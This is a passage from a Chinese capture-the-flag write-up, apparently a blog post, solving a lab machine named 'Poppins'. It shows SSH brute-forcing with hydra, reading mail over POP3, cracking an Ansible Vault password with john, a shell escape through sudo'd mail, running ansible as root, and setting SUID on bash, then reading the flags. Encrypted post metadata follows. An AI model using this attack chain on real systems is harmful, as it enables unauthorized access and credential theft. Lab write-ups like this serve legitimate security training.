user\njane\nbert\n```\n\n\u53d1\u73b0\u4e09\u4e2a\u6709\u6548\u7528\u6237\uff1ajane\u3001bert\u3001root\n\n## SSH\u5bc6\u7801\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ echo -e 'jane\\nbert\\nroot' > user                                                       \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ hydra -L user -P pass ssh://192.168.205.143 -I -u -e nsr -t 64\n...\n[22][ssh] host: 192.168.205.143   login: bert   password: jmac92777\n```\n\n\u6210\u529f\u83b7\u5f97bert\u7528\u6237\u7684\u51ed\u636e\uff1a`bert:jmac92777`\n\n# \u4e94\u3001\u521d\u59cb\u8bbf\u95ee\u4e0e\u90ae\u4ef6\u5206\u6790\n\n\u5c1d\u8bd5SSH\u767b\u5f55bert\u7528\u6237\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ssh bert@192.168.205.143          \nbert@192.168.205.143's password: \n...\nYou have mail.\nThis account is currently not available.\nConnection to 192.168.205.143 closed.\n```\n\n\u867d\u7136SSH\u4f1a\u8bdd\u88ab\u7acb\u5373\u5173\u95ed\uff0c\u4f46\u63d0\u793a\u663e\u793a\u6709\u90ae\u4ef6\u3002\u4f7f\u7528POP3\u534f\u8bae\u67e5\u770b\u90ae\u4ef6\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nc 192.168.205.143 110\n+OK Dovecot (Debian) ready.\nUser bert\n+OK\nPass jmac92777\n+OK Logged in.\nSTAT\n+OK 1 1517\nretr 1\n+OK 1517 octets\n```\n\n\u90ae\u4ef6\u5185\u5bb9\u663e\u793aJane\u53d1\u9001\u7ed9Bert\u7684\u91cd\u8981\u4fe1\u606f\uff1a\n\n```\nSubject: Urgent: Prod Server Credentials for Ansible Playbook\nFrom: jane@poppins\nTo: bert@poppins\n\nHi Bert,\n\nI've just finished the new Ansible playbook for the a-27 software deployment on our main production server, `web01.poppins.dsz`. It's ready to go.\n\nThe playbook contains some sensitive API keys, so I've encrypted the variables using Ansible Vault. You'll need to use the `ansible-vault decrypt` command to run it.\n\nHere is the vault string you'll need to paste into the `secrets.yml` file.\n\n$ANSIBLE_VAULT;1.1;AES256\n66626631636362303332633238373338386634373434646532656534323230333938303331663630\n3236333934663930343263363831353138323630393134320a366366393939373636386538336336\n34353536656637313762323832643339633234656635326137633439303730373335386536306436\n6335363366376634630a326563623737626337353436323565643365333061663661396337613731\n3730\n```\n\n# \u516d\u3001Ansible Vault\u7834\u89e3\n\n## \u63d0\u53d6\u5e76\u7834\u89e3Vault\u5bc6\u7801\n\n\u5c06Vault\u5185\u5bb9\u4fdd\u5b58\u5230\u6587\u4ef6\u5e76\u4f7f\u7528john\u7834\u89e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ansible2john secrets.yml > hash                                                \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                             \n...\njaviel           (secrets.yml)   \n```\n\n\u4f7f\u7528\u7834\u89e3\u7684\u5bc6\u7801\u89e3\u5bc6Vault\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ansible-vault view secrets.yml                                                 \nVault password: javiel\ncumibug\n```\n\n\u83b7\u5f97\u4e24\u4e2a\u5173\u952e\u4fe1\u606f\uff1a\n\n- Vault\u5bc6\u7801\uff1a`javiel`\n- \u89e3\u5bc6\u540e\u7684\u5bc6\u7801\uff1a`cumibug`\n\n# \u4e03\u3001\u6743\u9650\u63d0\u5347\n\n## \u83b7\u5f97Jane\u7528\u6237\u6743\u9650\n\n\u5c1d\u8bd5\u4f7f\u7528\u89e3\u5bc6\u7684Vault\u5bc6\u7801\u4f5c\u4e3aJane\u7684\u5bc6\u7801\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ssh jane@192.168.205.143\njane@192.168.205.143's password: javiel\n...\njane@Poppins:~$ id\nuid=1001(jane) gid=1001(jane) groups=1001(jane)\n```\n\n## \u5207\u6362\u5230Michael\u7528\u6237\n\n\u4f7f\u7528Vault\u4e2d\u7684\u5bc6\u7801\u5207\u6362\u5230michael\u7528\u6237\uff1a\n\n```bash\njane@Poppins:/home$ su michael\nPassword: cumibug\nmichael@Poppins:/home$ sudo -l\n...\nUser michael may run the following commands on Poppins:\n    (winifred) PASSWD: /usr/bin/mail *\n```\n\nMichael\u53ef\u4ee5\u4ee5winifred\u7528\u6237\u8eab\u4efd\u8fd0\u884cmail\u547d\u4ee4\u3002\n\n## \u5229\u7528mail\u547d\u4ee4\u63d0\u5347\u5230Winifred\n\n\u53c2\u8003GTFObins\uff0cmail\u547d\u4ee4\u53ef\u4ee5\u901a\u8fc7\u4ea4\u4e92\u5f0fshell\u9003\u9038\uff0c\u4f46\u662f\u56e0\u4e3a\u5b83\u8fd9\u4e2amail\u547d\u4ee4\u7248\u672c\u592a\u4f4e\uff08\u5e94\u8be5\u662f\u5427\uff09\u7684\u539f\u56e0\uff0c\u65e0\u6cd5\u76f4\u63a5\u4f7f\u7528`--exec`\u53c2\u6570\uff0c\u6211\u4eec\u53ea\u53ef\u4ee5\u7ed9\u81ea\u5df1\u53d1\u9001\u4e00\u4e2a\u90ae\u4ef6\uff0c\u8fdb\u5230mail\u4ea4\u4e92\u901a\u8fc7\u4ea4\u4e92\u5f0fshell\u9003\u9038\uff1a\n\n```bash\nmichael@Poppins:/home$ sudo -u winifred /usr/bin/mail -s 'test' winifred < /dev/null\nNull message body; hope that's ok\nmichael@Poppins:/home$ sudo -u winifred /usr/bin/mail\nMail version 8.1.2 01/15/2001.  Type ? for help.\n'/var/mail/winifred': 1 message 1 new\n>N  1 winifred@poppins   Tue Sep 02 09:41   18/558   test\n& !/bin/bash\n```\n\n\u6210\u529f\u83b7\u5f97winifred\u7528\u6237\u6743\u9650\uff1a\n\n```bash\nwinifred@Poppins:/home$ sudo -l\n...\nUser winifred may run the following commands on Poppins:\n    (ALL) NOPASSWD: /usr/bin/ansible *\n```\n\n## \u5229\u7528Ansible\u83b7\u5f97Root\u6743\u9650\n\nWinifred\u53ef\u4ee5\u65e0\u5bc6\u7801\u8fd0\u884cansible\u547d\u4ee4\u3002Ansible\u7684shell\u6a21\u5757\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff1a\n\n```bash\nwinifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a 'id' \n[WARNING]: No inventory was parsed, only implicit localhost is available\nlocalhost | CHANGED | rc=0 >>\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u4e3abash\u8bbe\u7f6eSUID\u4f4d\u4ee5\u83b7\u5f97\u6301\u4e45\u7684root\u6743\u9650\uff1a\n\n```bash\nwinifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a 'chmod +s /bin/bash' \n...\nwinifred@Poppins:/home$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash\nwinifred@Poppins:/home$ bash -p\nbash-5.0# id\nuid=1003(winifred) gid=1003(winifred) euid=0(root) egid=0(root) groups=0(root),1003(winifred)\n```\n\n# \u516b\u3001\u83b7\u53d6flag\n\n```bash\nbash-5.0# cat /root/root.txt /var/mail/user.txt \nflag{root-bdabe071bed8018ba8e15d795d281843}\nflag{user-b1d2367529a9edd2a6f9c95168bce12ei}\n```\n\nsentence", "top": 0, "createdAt": 1756967143, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-09-04", "dateLabelColor": "#0969da"}, "P242": {"htmlDir": "docs/post/\ud83d\udd12-nei-bu-_Maze.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\ud83d\udd12\u5185\u90e8_Maze", "postUrl": "post/%F0%9F%94%92-nei-bu-_Maze.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/242", "commentNum": 0, "wordCount": 12274, "description": "<!-- ##{'script':'<script src='https://7r1umphk.github.io/plugins/jiami.js'></script>'}## -->\n<!--encrypt: 3ea4d927-->\n<!--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